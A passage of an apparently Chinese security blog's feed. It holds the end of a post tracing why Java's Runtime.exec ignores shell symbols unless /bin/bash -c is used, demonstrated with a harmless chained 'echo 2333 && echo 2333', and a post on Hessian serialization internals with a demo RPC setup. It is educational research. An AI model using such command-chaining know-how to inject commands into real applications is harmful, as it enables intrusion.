alt="image.png"><br>JDK_execvpe最后调用系统execvp函数，我们来细一看传参情况。</p><p><img src="1577886891144-925b1102-3c6f-4752-b0ba-b5b94d1def00.png#align=left&display=inline&height=452&name=image.png&originHeight=904&originWidth=1838&size=123585&status=done&style=none&width=919" alt="image.png"></p><p><img src="1577887135995-42990dc8-ec02-401e-9213-eddf7e418801.png#align=left&display=inline&height=213&name=image.png&originHeight=356&originWidth=1246&size=39821&status=done&style=none&width=746" alt="image.png"></p><p><img src="1577887148131-a6992150-ab3e-4e82-a93c-c5927f254965.png#align=left&display=inline&height=177&name=image.png&originHeight=292&originWidth=1230&size=31775&status=done&style=none&width=746" alt="image.png"></p><p><img src="1577887164428-ce737fbd-2e40-4702-820a-d45b23fa2954.png#align=left&display=inline&height=212&name=image.png&originHeight=354&originWidth=1244&size=39562&status=done&style=none&width=746" alt="image.png"></p><p>故数组情况下等价于<br><img src="1577774188360-408cc7a4-bffe-4360-a859-f6e5b6b20a4f.png#align=left&display=inline&height=310&name=image.png&originHeight=620&originWidth=2246&size=111327&status=done&style=none&width=1123" alt="image.png"></p><p>那么我们再来考察一下，字符串的情况的情况。<br><img src="1577892353386-8b9d3cb5-d1a0-4c85-bd25-555f2dc45f04.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1226&size=21350&status=done&style=none&width=746" alt="image.png"><br><img src="1577892370784-45fd9581-4a77-41b5-99c3-70031f64f1f0.png#align=left&display=inline&height=121&name=image.png&originHeight=200&originWidth=1228&size=21627&status=done&style=none&width=746" alt="image.png"><br><img src="1577892391866-8b0b4576-a0c0-403b-8c41-13a8848e700b.png#align=left&display=inline&height=116&name=image.png&originHeight=192&originWidth=1234&size=22711&status=done&style=none&width=746" alt="image.png"><br><img src="1577892410406-82bd1a5c-7106-4077-ac07-fa9cb05d972b.png#align=left&display=inline&height=120&name=image.png&originHeight=190&originWidth=1182&size=21050&status=done&style=none&width=746" alt="image.png"><br><img src="1577892490628-2810628a-be2b-4db9-90e9-2845970634e4.png#align=left&display=inline&height=114&name=image.png&originHeight=184&originWidth=1206&size=20774&status=done&style=none&width=746" alt="image.png"><br><img src="1577892526498-a9e7e761-b5af-452f-82db-cf194e00d3bf.png#align=left&display=inline&height=114&name=image.png&originHeight=190&originWidth=1244&size=22425&status=done&style=none&width=746" alt="image.png"><br><img src="1577892558443-d47b918c-5559-47e7-b68b-8af7db6aec8e.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1230&size=22185&status=done&style=none&width=746" alt="image.png"></p><p>故字符串模式等价于</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"'echo"</span>, <span class="string">"2333"</span>, <span class="string">"&amp;&amp;"</span>, <span class="string">"echo"</span>, <span class="string">"2333'"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(arg[<span class="number">0</span>],(<span class="keyword">char</span> **) arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1577774099636-86487450-9203-4284-ba2c-d16a7e1297c8.png#align=left&display=inline&height=326&name=image.png&originHeight=652&originWidth=2692&size=136647&status=done&style=none&width=1346" alt="image.png"></p><p>所以整个调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.exec(cmd);</span><br><span class="line">-&gt;java.lang.ProcessBuilder.start();</span><br><span class="line">--&gt;java.lang.ProcessImpl.start();</span><br><span class="line">---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se&#x2F;src&#x2F;solaris&#x2F;native&#x2F;java&#x2F;lang&#x2F;UNIXProcess_md.c</span><br><span class="line">----&gt;fork或VFORK或POSIX_SPAWN</span><br><span class="line">-----&gt;execvp();</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>_Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _这样的符号特殊处理_的本质是execvp也确实不支持shell中的特殊符号。而之所以数组情况能成是因为execvp调用了 <code>/bin/bash</code> ，<code>/bin/bash</code> 解释了 <code>&amp;</code> , <code>|</code> 这些特殊符号和execvp没关系。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Java下奇怪的命令执行</a><br><a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg">在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法</a><br><a href="https://www.cnblogs.com/LittleHann/p/4326828.html">Java JVM、JNI、Native Function Interface、Create New Process Native Function API Analysis</a><br><a href="https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion">How to debug a forked child process using CLion</a></p>]]></content>
    
    <summary type="html">
    
      这篇文章主要目的在于学习前人文章，并从更深入一点的角度探讨为什么Runtime.getRuntime().exec某些时候会失效这个问题。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Hessian 序列化代码分析及业务场景学习</title>
    <link href="http://yoursite.com/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-03T14:21:42.000Z</published>
    <updated>2020-07-11T08:03:08.065Z</updated>
    
    <content type="html"><![CDATA[<!-- Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能 --><!-- more --><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能。早在08年有人做过测试：一个UserData类，有一个字符串属性，一个日期属性,一个double属性，分别用java,hessian来序列化一百万次,结果让人吃惊,不止是hessian序列化的速度要比java的快上一倍，而且hessian序列化后的字节数也要比java的少一倍。</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化宏观来看就四步</p><ol><li>建立进行序列化的工厂类</li><li>用工厂类找到要要进行序列化类对应的序列化器</li><li>序列化器对将进行序列化的对象进行内省</li><li>内省完成后调用序列化器的writeObject（writeObject中按照一定规则把数据写入byte流）</li></ol><p>下面用Hessian简单序列化一个对象来看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    User() &#123;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        name = <span class="string">"cl0und"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        ByteArrayOutputStream os=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        HessianOutput output=<span class="keyword">new</span> HessianOutput(os);</span><br><span class="line">        output.writeObject(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="建立进行序列化的工厂类"><a href="#建立进行序列化的工厂类" class="headerlink" title="建立进行序列化的工厂类"></a>建立进行序列化的工厂类</h3><p>把ByteArrayOutputStream放入了HessianOutput中典型的装饰器模式。<br><img src="1578018650932-4f7b0b12-c08d-49fd-9b13-a106a7241095.png" alt="image.png"></p><p>新建序列工厂类（后续会通过工厂类来寻找类的对应序列化器）。<br><img src="1578018510750-27953aaa-dcd1-4479-9534-9324d5dbaef7.png" alt="image.png"></p><p>工厂类的创建过程中，在类静态块中加入了java各种类型的反序列器以及和Hessian有关的反序列器。这里和序列化没关系，只是提一嘴。<img src="1578056872628-e9e64d41-63d6-4a29-851e-31f645c46dcb.png" alt="image.png"></p><p>在类初始化完成后，正式进入SerializerFactory的构造方法。可以看到SerializerFactory允许不安全的序列化，设置默认的上下文工厂类是_contextFactory，这个_contextFactory是生产序列化器的工厂。<br><img src="1578018782918-44d51486-ba54-496b-b388-08cce55da23f.png" alt="image.png"></p><p><img src="1578020378163-c8312b90-7712-4eee-9793-98befa59ba79.png" alt="image.png"></p><h3 id="用工厂类找到要要进行序列化类对应的序列化器"><a href="#用工厂类找到要要进行序列化类对应的序列化器" class="headerlink" title="用工厂类找到要要进行序列化类对应的序列化器"></a>用工厂类找到要要进行序列化类对应的序列化器</h3><p>根据传入类型获取相应的序列化器。<br><img src="1578018871570-0e8cbc5b-bc58-460c-b6d2-d44fac4f9232.png" alt="image.png"></p><p>获取序列化器的规则是如果_cachedSerializerMap里面又就直接从里面取，如果没有就用loadSerializer找，找出来的加入_cachedSerializerMap避免二次加载。<br><img src="1578018931958-a405efcd-b970-48fc-a579-6ab9dd9adbd5.png" alt="image.png"></p><p>loadSerializer找的逻辑是先看有没有其它工厂类，如果有就用，如果没有就用_contextFactory造。<br><img src="1578019332986-acb7d611-ab63-4eab-9417-1595a87e8f89.png" alt="image.png"></p><p>因为User是自建类型_contextFactory造不出对应序列化器。<br><img src="1578020722501-2751e375-f821-4b90-a060-d4a89929b36f.png" alt="image.png"></p><p>下一步尝试getCustomSerializer来找序列化器，看方法的意思应该是找是否有客户自己定制的序列化器。生成序列器规则是：如果_customSerializerMap有就直接返回，如果没有就按照_类名+HessianSerializer_的规则来找。很遗憾我们并没有对User做个性化定制。<br><img src="1578020850955-a7f2fca3-0f4d-4446-8c74-78584c1adcfe.png" alt="image.png"></p><p>因为没有我们没有对User做个性化的序列化器，所以最后会调用getDefaultSerializer来返回默认序列化器。又因为User既不是内置类也不是和hessian有关的特殊类但是允许了不安全的序列化，所以最后被选中的序列化器是UnsafeSerializer。<br><img src="1578036755615-9fda6962-c2ee-4250-ae0d-bf9ac12f1573.png" alt="image.png"></p><h3 id="序列化器对序列化对象进行内省"><a href="#序列化器对序列化对象进行内省" class="headerlink" title="序列化器对序列化对象进行内省"></a>序列化器对序列化对象进行内省</h3><p>在构造方法中使用introspect进行内省。<br><img src="1578022299793-2d917569-2b48-4a40-b641-1f7dbd68d54d.png" alt="image.png"></p><p><img src="1578022661148-31eaa214-4623-4d53-8c03-d54625986822.png" alt="image.png"></p><p>introspect最后几步是在为类里面的属性找序列化器（getFiledSerializer）。<br><img src="1578026402777-b2f40c49-d717-475e-9874-d7244f823d85.png" alt="image.png"></p><p>比如这里User类中name属性是String，就创建针对String的序列化器。<br><img src="1578026468907-63b0955a-6cb0-4fde-b2b8-079ec936e618.png" alt="image.png"></p><p>String的序列化器包含了field类及其偏移量。<br><img src="1578035822247-43e9dad1-3122-4c40-861c-9f05f0346dc2.png" alt="image.png"></p><p>创建类及及其字段序列化器后一路向外传，然后调用writeObject。<br><img src="1578054376515-e69a20a8-3ee8-4a8e-9a16-f422e144c663.png" alt="image.png"></p><p><img src="1578054878060-3ec4b6c4-b62d-44e3-b0af-76d33c0a5385.png" alt="image.png"></p><p>writeObjectBegin 写了Object的魔术头、长度、类名<br><img src="1578059835151-a62d0cba-183f-44b6-85e2-a59c69e2cb89.png" alt="image.png"><br><img src="1578059865287-b2958526-3372-450b-90c6-3900ad380034.png" alt="image.png"><br>writeObject10 负责序列化字段<br><img src="1578055007325-a2d4943e-0e7a-41e5-b9ce-2b92ccf5ed7e.png" alt="image.png"></p><p>先是写要序列化的字符串魔术值、字段名长度、字段名，其中 <code>os.write(83)</code> 代表 <code>S</code> 代表字符串。<img src="1578055257437-7c63a33c-2d8b-4e64-971b-c70f9519f5dc.png" alt="image.png"></p><p>String类型学序列化的时候<br><img src="1578055611722-af337b28-b489-4381-80b9-831a7fa87df4.png" alt="image.png"><br><img src="1578055873704-aa60f07f-6ba7-4cc8-9727-bec3787f9861.png" alt="image.png"></p><p>int类型序列化的时候<br><img src="1578055767135-360790fd-1b05-4b4c-a963-ffc97ca83946.png" alt="image.png"><br><img src="1578055703641-922968f1-89be-4dae-8423-5fcf0cb4f734.png" alt="image.png"></p><p>最后的结果<br><img src="1578059987421-90e3ff15-6b85-448e-9785-a08152c6ef01.png" alt="image.png"></p><h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>说穿了就是RPC，用实际的代码来看看<br>pom.xml加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>service-class<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.syclover.hessian.BasicService<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/api/service<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码忘记从网上哪里copy的了，侵删。</p><p>client/server端共有代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置用户名 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取问候 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取用户信息 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://localhost:8080/hessianTest_war_exploded/api/service"</span>;</span><br><span class="line">        HessianProxyFactory factory = <span class="keyword">new</span> HessianProxyFactory();</span><br><span class="line">        IBasicApi api = (IBasicApi) factory.create(IBasicApi<span class="class">.<span class="keyword">class</span>, <span class="title">url</span>)</span>;</span><br><span class="line">        api.setUserName(<span class="string">"mahc"</span>);</span><br><span class="line">        System.out.println(api.sayHello());</span><br><span class="line">        System.out.println(api.getUser().getName());</span><br><span class="line">        System.out.println(api.getUser().getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.syclover.hessian.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicService</span> <span class="keyword">implements</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">",Welcome to Hessian!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(name, <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里为了测试方便把c/s放到一起了<br><img src="1578060757509-0a3de905-6438-4bea-bfab-f18df997a87a.png" alt="image.png"></p><h3 id="进行RPC"><a href="#进行RPC" class="headerlink" title="进行RPC"></a>进行RPC</h3><p><img src="1578060910923-4235fecb-4e57-4c19-990c-5ea3502505a5.png" alt="image.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/mahoking/article/details/51704966">Hessian使用教程</a><br><a href="https://juejin.im/entry/595996e25188250d8324118d">JVM 类装载原理分析－ClassLoader原理分析</a><br><a href="https://www.iteye.com/topic/245238">hessian 序列化实现 初探</a></p>]]></content>
    
    <summary type="html">
    
      Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JAVA JNI 执行命令与调试</title>
    <link href="http://yoursite.com/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/</id>
    <published>2019-12-31T08:16:26.000Z</published>
    <updated>2020-07-11T08:03:10.861Z</updated>
    
